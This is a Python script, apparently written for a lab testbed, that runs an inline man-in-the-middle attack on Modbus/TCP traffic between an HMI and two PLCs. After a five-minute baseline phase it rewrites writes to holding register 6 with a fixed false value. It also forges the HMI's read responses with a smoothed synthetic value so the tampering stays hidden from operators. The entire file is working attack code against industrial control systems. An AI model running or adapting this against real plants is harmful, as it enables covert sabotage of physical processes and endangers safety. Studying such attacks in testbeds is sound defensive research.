#!/usr/bin/env python3
from netfilterqueue import NetfilterQueue
from scapy.all import IP, TCP, Raw
import struct
import datetime
import time
from collections import deque

# ===== CONFIG =====
IFACE = "eth1"
HMI_IP  = "172.27.224.10"
PLC1_IP = "172.27.224.250"
PLC2_IP = "172.27.224.251"

TARGET_REGISTER = 6              # holding register alvo
ARTIFICIAL_VALUE = 20            # valor falso enviado ao PLC1 (FC6)
BUFFER_SIZE = 100                # nº de valores reais para acumular
EMA_ALPHA = 0.2                  # suavização da baseline real
SYNTH_ALPHA = 0.1                # suavização do valor sintético adulterado
NATURAL_RANGE_MIN = 1            # amplitude mínima para o valor adulterado "respirar"
WAIT_SECONDS = 5 * 60            # período de espera (5 minutos) e recolha de dados

STRICT_IP_FILTERS = True         # se False, aplica a todos
# ==================

# ===== LOGGING =====
LOGFILE = f"modbus_mitm.log"

def log(msg, color=None):
    COLORS = {
        "red": "\033[91m",
        "green": "\033[92m",
        "yellow": "\033[93m",
        "blue": "\033[94m",
        "reset": "\033[0m"
    }
    prefix = f"{datetime.datetime.now().strftime('%H:%M:%S')} "
    if color and color in COLORS:
        print(f"{COLORS[color]}{prefix}{msg}{COLORS['reset']}")
    else:
        print(prefix + msg)
    with open(LOGFILE, "a") as f:
        f.write(prefix + msg + "\n")

# ===================

start_time = time.time()
value_buffer = deque(maxlen=BUFFER_SIZE)
fc3_requests = {}

baseline_value = None   
synthetic_value = None  
started = False         

def u16(b):
    return struct.unpack(">H", b)[0]

def p16(v):
    return struct.pack(">H", v & 0xFFFF)

def looks_like_modbus(raw):
    return len(raw) >= 8

def get_buffer_avg():
    if len(value_buffer) == 0:
        return None
    return sum(value_buffer) / len(value_buffer)

def compute_bounds():
    avg = get_buffer_avg()
    if avg is None:
        return (None, None, None)
    delta = max(NATURAL_RANGE_MIN, int(abs(avg) * 0.01))
    return (avg, avg - delta, avg + delta)

def update_baseline(new_val):
    global baseline_value
    if baseline_value is None:
        baseline_value = new_val
    else:
        baseline_value = (1 - EMA_ALPHA) * baseline_value + EMA_ALPHA * new_val

def update_synthetic():
    global synthetic_value
    if not started or baseline_value is None:
        return
    base, low, high = compute_bounds()
    if base is None:
        return
    if synthetic_value is None:
        synthetic_value = base
    else:
        synthetic_value = (1 - SYNTH_ALPHA) * synthetic_value + SYNTH_ALPHA * base
    synthetic_value = int(round(synthetic_value))
    synthetic_value = max(int(low), min(int(high), synthetic_value))

def process(pkt):
    global started
    now = time.time()
    elapsed = now - start_time

    spkt = IP(pkt.get_payload())
    if not spkt.haslayer(TCP) or not spkt.haslayer(Raw):
        pkt.accept()
        return

    ip = spkt[IP]
    tcp = spkt[TCP]
    raw = bytes(spkt[Raw].load)

    if tcp.dport != 502 and tcp.sport != 502:
        pkt.accept()
        return
    if not looks_like_modbus(raw):
        pkt.accept()
        return

    # MBAP
    trans_id = u16(raw[0:2])
    unit_id = raw[6]
    pdu = raw[7:]
    fc = pdu[0]

    modified = False

    # --------- FC6: Write Single Register (PLC2 -> PLC1) ---------
    if tcp.dport == 502 and fc == 6:
        if len(pdu) >= 5:
            reg = u16(pdu[1:3])
            val = u16(pdu[3:5])
            if (not STRICT_IP_FILTERS) or (ip.src == PLC2_IP and ip.dst == PLC1_IP):
                if reg == TARGET_REGISTER:
                    value_buffer.append(val)
                    update_baseline(val)
                    if elapsed >= WAIT_SECONDS and len(value_buffer) >= BUFFER_SIZE:
                        started = True
                        new_pdu = bytes([fc]) + p16(reg) + p16(ARTIFICIAL_VALUE)
                        spkt[Raw].load = raw[:7] + new_pdu + raw[12:]
                        modified = True
                        log(f"[FC6] {ip.src}->{ip.dst} TID={trans_id} reg={reg} "
                            f"REAL={val} -> FAKE={ARTIFICIAL_VALUE} "
                            f"| buffer={list(value_buffer)}", "red")
                    else:
                        log(f"[FC6] {ip.src}->{ip.dst} TID={trans_id} reg={reg} REAL={val} "
                            f"(fase de recolha {int(elapsed)}s/{WAIT_SECONDS}s, "
                            f"buffer {len(value_buffer)}/{BUFFER_SIZE})", "blue")

    # --------- FC3: Read Holding Registers (pedido HMI->PLC1) ----
    if tcp.dport == 502 and fc == 3:
        if len(pdu) >= 5:
            start = u16(pdu[1:3])
            qty = u16(pdu[3:5])
            if (not STRICT_IP_FILTERS) or (ip.src == HMI_IP and ip.dst == PLC1_IP):
                key = (ip.dst, ip.src, trans_id, unit_id)
                fc3_requests[key] = (start, qty)
                log(f"[FC3-REQ] {ip.src}->{ip.dst} TID={trans_id} start={start} qty={qty}", "yellow")

    # --------- FC3 RESPONSE: (PLC1->HMI) -------------------------
    if tcp.sport == 502 and fc == 3 and started:
        update_synthetic()
        if synthetic_value is not None and len(pdu) >= 3:
            byte_count = pdu[1]
            data = pdu[2:2+byte_count]
            if len(data) == byte_count and byte_count >= 2:
                key = (ip.src, ip.dst, trans_id, unit_id)
                if key in fc3_requests:
                    start, qty = fc3_requests.pop(key)
                    if start <= TARGET_REGISTER < start + qty:
                        offset_words = TARGET_REGISTER - start
                        offset_bytes = offset_words * 2
                        if offset_bytes + 2 <= len(data):
                            new_data = bytearray(data)
                            new_data[offset_bytes:offset_bytes+2] = p16(synthetic_value)
                            new_pdu = bytes([fc, byte_count]) + bytes(new_data)
                            spkt[Raw].load = raw[:7] + new_pdu + raw[9+byte_count:]
                            modified = True
                            log(f"[FC3-RESP] {ip.src}->{ip.dst} TID={trans_id} reg={TARGET_REGISTER} "
                                f"-> SYNTH={synthetic_value} | base={int(baseline_value)} "
                                f"buffer={list(value_buffer)}", "green")

    if modified:
        del spkt[IP].len
        del spkt[IP].chksum
        del spkt[TCP].chksum
        pkt.set_payload(bytes(spkt))

    pkt.accept()

def main():
    log(f"=== Modbus Inline Interceptor iniciado em {datetime.datetime.now()} ===", "blue")
    log(f"Log a ser gravado em {LOGFILE}", "blue")
    log(f"[INFO] Aguardando {WAIT_SECONDS} segundos (≈{WAIT_SECONDS//60} min) antes de adulterar FC6...", "blue")
    q = NetfilterQueue()
    q.bind(1, process)
    try:
        log("[INFO] A processar NFQUEUE #1 ... Ctrl+C para sair", "blue")
        q.run()
    except KeyboardInterrupt:
        log("[INFO] Encerrado pelo utilizador", "blue")

if __name__ == "__main__":
    main()